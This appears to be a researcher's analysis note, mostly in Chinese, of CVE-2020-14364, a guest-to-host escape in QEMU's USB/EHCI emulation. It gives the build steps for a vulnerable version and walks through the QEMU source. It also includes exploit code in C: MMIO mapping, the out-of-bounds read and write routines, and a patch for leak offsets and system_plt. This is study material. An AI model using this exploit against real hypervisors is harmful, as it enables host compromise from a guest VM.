# Description

> An out-of-bounds read/write access flaw was found in the USB emulator of the QEMU in versions before 5.2.0. This issue occurs while processing USB packets from a guest when USBDevice 'setup_len' exceeds its 'data_buf[4096]' in the do_token_in, do_token_out routines. This flaw allows a guest user to crash the QEMU process, resulting in a denial of service, or the potential execution of arbitrary code with the privileges of the QEMU process on the host.

# Detail

[CVE-2020-14364-Qemu逃逸漏洞分析及两种利用思路 - 先知社区](https://xz.aliyun.com/t/8320)

关键数据结构

[USB](https://www.notion.so/USB-efd253862a734386b7a18b3164971d06)

[EHCI](https://www.notion.so/EHCI-fd6ad525ca9540eda83e95513589dbeb)

[Functions](https://www.notion.so/Functions-8eeb1d9e88f547b68b424649f7a2423c)

[POC](https://www.notion.so/POC-cd15fbdff05b4d5aa31d478b78694784)

# Environment

```bash
# qemu tags/v4.2.1
git clone git://git.qemu-project.org/qemu.git
cd qemu
git checkout tags/v4.2.1
mkdir -p bin/debug/naive
cd bin/debug/naive
../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror --enable-spice
make
# 制作ubuntu镜像
qemu-img create -f qcow2 ubuntu-server.qcow2 5G
sudo kvm -m 1028 -cdrom /mnt/hgfs/Share/VM-study/ubuntu-18.04.5-live-server-amd64.iso -drive file=ubuntu-server.qcow2,if=virtio -net nic,model=virtio -net tap,script=no -boot d -vnc :0
# 制作usb设备
qemu-img create -f raw disk_01.img 32M
mkfs.vfat disk_01.img
# 启动脚本
naive/x86_64-softmmu/qemu-system-x86_64 \
    -machine q35 \
    -m 1G \
    -hda ubuntu-server.qcow2 \
    -device e1000,netdev=net0 \
    -netdev user,id=net0,hostfwd=tcp::5555-:22 \
    -enable-kvm \
    -usb \
    -drive if=none,format=raw,id=disk1,file=disk_01.img \
    -device usb-storage,drive=disk1 \
    -device qxl-vga \
```

## Debug

断点

```c
b *0x0000555555ba8b7e do_token_setup<+204>->fprintf
handle SIGUSR1 nostop
```

### EXP

1. init

```c
mmio_fd = open("/sys/devices/pci0000:00/0000:00:1d.7/resource0", O_RDWR|O_SYNC);
mmio_mem = mmap(0, 0x1000,PROT_READ|WRITE, MAP_SHARED, mmio_fd, 0);
dmabuf = mmap(0, 0x3000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
entry = dmabuf + 4;
qh = dmabuf + 0x100;
qtd = dmabuf + 0x200;
setup_buf = dmabuf + 0x300;
data_buf = dmabuf + 0x1000;
data_buf_oob = dmabuf + 0x2000;
```

2. ehci结构

EHCI可以理解为是为USB2.0提供的接口规范。

- `EHCIState.opregbase`是包含很多控制寄存器，包括`usbcmd\periodiclistbase`等域，`opregbase`的偏移为0x20，此mmio空间的读写函数为`ehci_opreg_read|write`.

```c
static void usb_ehci_pci_init(Object *obj)
{
    DeviceClass *dc = OBJECT_GET_CLASS(DeviceClass, obj, TYPE_DEVICE);
    EHCIPCIState *i = PCI_EHCI(obj);
    EHCIState *s = &i->ehci;
    s->opregbase = 0x20;
    ...
}
union {
        uint32_t opreg[0x44/sizeof(uint32_t)];
        struct {
            uint32_t usbcmd;
            uint32_t usbsts;
            uint32_t usbintr;
            uint32_t frindex;
            uint32_t ctrldssegment;
            uint32_t periodiclistbase;
            uint32_t asynclistaddr;
            uint32_t notused[9];
            uint32_t configflag;
        };
    };
```

3. set_EHCIState

```c
void set_EHCIState(){
    mmio_write(0x34, virt2phys(dmabuf)); // periodiclistbase
    mmio_write(0x20, USBCMD_RUNSTOP | USBCMD_PSE); // usbcmd
    sleep(1);
}
```

```c
static void ehci_advance_periodic_state(EHCIState *ehci)
	{
	switch(ehci_get_state(ehci, async)) {
	case EST_ACTIVE:
	list = ehci->periodiclistbase & 0xfffff000; 【1】
	list |= ((ehci->frindex & 0x1ff8) >> 1);[2]
	get_dwords(ehci, list, &entry, 1);
	ehci_set_fetch_addr(ehci, async,entry);[3]
	ehci_advance_state(ehci, async);
	break;
...
}

```

根据上文分析，`set_EHCIState`设置了`opregbase.usbcmd`和`opregbase.periodiclistbase`的值。在函数`ehci_work_bh`中，由于设置了`usbcmd=USBCMD_RUNSTOP|USBCMD_PSE`，因此可以进入`ehci_advance_periodic_state`函数。

在`ehci_advance_periodic_state`函数中，经过[1-3]实际上导致，`s→p_fetch_addr = (virt2phys(dmabuf)+4)`，poc中设置了`*(dmabuf+4)=virt2phys(qh)+2`，这是因为在`ehci_advance_state`函数中进行了如下处理：首先进入`EST_FETCHENTRY`分支[4]，设置`echi→state`[5]；当此`state==EST_FETACHQH`时[6]，才能进入`ehci_state_fetchqh`函数，在后者中为`qh`分配了空间[7]。因此，在poc中需要设置`*entry=virt2phys(qh)+2`，才能进入正确分支。

```c
static void ehci_advance_state(EHCIState *ehci, int async)
{
	case EST_FETCHENTRY:[4]
            again = ehci_state_fetchentry(ehci, async);
            break;

        case EST_FETCHQH:[6]
            q = ehci_state_fetchqh(ehci, async);
            if (q != NULL) {
                assert(q->async == async);
                again = 1;
            } else {
                again = 0;
            }
            break;
	case EST_EXECUTE:
            assert(q != NULL);
            again = ehci_state_execute(q);
            if (async) {
                ehci->async_stepdown = 0;
            }
            break;
	...
}
static int ehci_state_fetchentry(EHCIState *ehci, int async)
{
	uint32_t entry = ehci_get_fetch_addr(ehci, async);
	switch (NLPTR_TYPE_GET(entry)) {[5]
	    case NLPTR_TYPE_QH:
	        ehci_set_state(ehci, async, EST_FETCHQH);
	        again = 1;
	        break;
	...
}

#define NLPTR_TYPE_QH            1     // queue head

#define NLPTR_TYPE_GET(x)        (((x) >> 1) & 3)

static EHCIQueue *ehci_state_fetchqh(EHCIState *ehci, int async)
{
    entry = ehci_get_fetch_addr(ehci, async);
    q = ehci_find_queue_by_qh(ehci, entry, async);
    if (q == NULL) {
        q = ehci_alloc_queue(ehci, entry, async);[7]
    }
    ...
}
```

整体调用流程是：

```c
aio_dispatch -> aio_bh_poll -> aio_bh_call -> ehci_work_bh ->
ehci_advance_periodic_state -> ehci_advance_state -> ehci_state_execute ->
ehci_execute -> usb_handle_packet -> usb_process_one -> do_token_setup
```

4. setup

```c
static int ehci_execute(EHCIPacket *p, const char *action)
{
    p->pid = ehci_get_pid(&p->qtd);
    usb_handle_packet(p->queue->dev, &p->packet);
    ...
}
static int ehci_get_pid(EHCIqtd *qtd)
{
    switch (get_field(qtd->token, QTD_TOKEN_PID)) { [8]
    case 0:
        return USB_TOKEN_OUT;
    case 1:
        return USB_TOKEN_IN;
    case 2:
        return USB_TOKEN_SETUP;
    default:
        fprintf(stderr, "bad token\n");
        return 0;
    }
}
static void usb_process_one(USBPacket *p)
{   
    USBDevice *dev = p->ep->dev;
    if (p->ep->nr == 0) {
        switch (p->pid) {
	        case USB_TOKEN_SETUP:
	            do_token_setup(dev, p);
	            break;
	        case USB_TOKEN_IN:
	            do_token_in(dev, p);
	            break;
	        case USB_TOKEN_OUT:
	            do_token_out(dev, p);
	            break;
	...
}
static void do_token_setup(USBDevice *s, USBPacket *p)
{
    s->setup_len   = (s->setup_buf[7] << 8) | s->setup_buf[6]; [9]
    ...
}
```

因此设置token决定进入`USB_TOKEN_OUT|IN|SETUP`的分支[8]，设置setup_buf决定越界的长度[9]。

5.越界读与越界写

```c
static void do_token_in(USBDevice *s, USBPacket *p)
{
    switch(s->setup_state) {
	case SETUP_STATE_DATA:
        if (s->setup_buf[0] & USB_DIR_IN) {
            int len = s->setup_len - s->setup_index;
            if (len > p->iov.size) {
                len = p->iov.size;
            }
            usb_packet_copy(p, s->data_buf + s->setup_index, len);
            s->setup_index += len;
            if (s->setup_index >= s->setup_len) {
                s->setup_state = SETUP_STATE_ACK;
            }
            return;
        }
        s->setup_state = SETUP_STATE_IDLE;
        p->status = USB_RET_STALL;
        break;
	...
}
static void do_token_out(USBDevice *s, USBPacket *p)
{
    switch(s->setup_state) {
	case SETUP_STATE_DATA:
        if (!(s->setup_buf[0] & USB_DIR_IN)) {
            int len = s->setup_len - s->setup_index;
            if (len > p->iov.size) {
                len = p->iov.size;
            }
            usb_packet_copy(p, s->data_buf + s->setup_index, len);
            s->setup_index += len;
            if (s->setup_index >= s->setup_len) {
                s->setup_state = SETUP_STATE_ACK;
            }
            return;
        }
        s->setup_state = SETUP_STATE_IDLE;
        p->status = USB_RET_STALL;
        break;
	...
}
//poc中的越界读写
void do_copy_read(){

    reset_enable_port();
    set_qh();

    qtd->token = QTD_TOKEN_ACTIVE | USB_TOKEN_IN << QTD_TOKEN_PID_SH | 0x1e00 << QTD_TOKEN_TBYTES_SH;
    qtd->bufptr[0] = virt2phys(data_buf);
    qtd->bufptr[1] = virt2phys(data_buf_oob);

    set_EHCIState();
}

void do_copy_write(int offset, unsigned int setup_len, unsigned int setup_index){

    reset_enable_port();
    set_qh();

    *(unsigned long *)(data_buf_oob + offset) = 0x0000000200000002; // 覆盖成原先的内容
    *(unsigned int *)(data_buf_oob + 0x8 +offset) = setup_len; //setup_len
    *(unsigned int *)(data_buf_oob + 0xc+ offset) = setup_index;

    qtd->token = QTD_TOKEN_ACTIVE | USB_TOKEN_OUT << QTD_TOKEN_PID_SH | 0x1e00 << QTD_TOKEN_TBYTES_SH; // flag
    qtd->bufptr[0] = virt2phys(data_buf);
    qtd->bufptr[1] = virt2phys(data_buf_oob);

    set_EHCIState();
}
```

- 设置`qtd→token==1<<8`且`setup_buf[0]==USB_DIR_IN`则进入越界读函数，其中`p→iov.size`由`qtd→token=size<<QTD_TOKEN_TBYTES_SH`确定，将`s→data_buf`读取到`qtd→bufptr[0]`中。
- 设置`qtd→token==1<<8`且`setup_buf[0]==USB_DIR_OUT`则进入越界写函数，将`qtd→bufptr[0]`复制到`s→data_buf`中。

6. poc patch

```c
-    struct USBDevice* usb_device_tmp = data_buf + 0x4;
+    struct USBDevice* usb_device_tmp = data_buf_oob + 0x4;

-    long long base = leak_addr - 0xc40d90;
-    uint64_t system_plt = base + 0x290D30;
+    long long base = leak_addr - 0xe53e70;
+    uint64_t system_plt = base + 0x28f030;
```
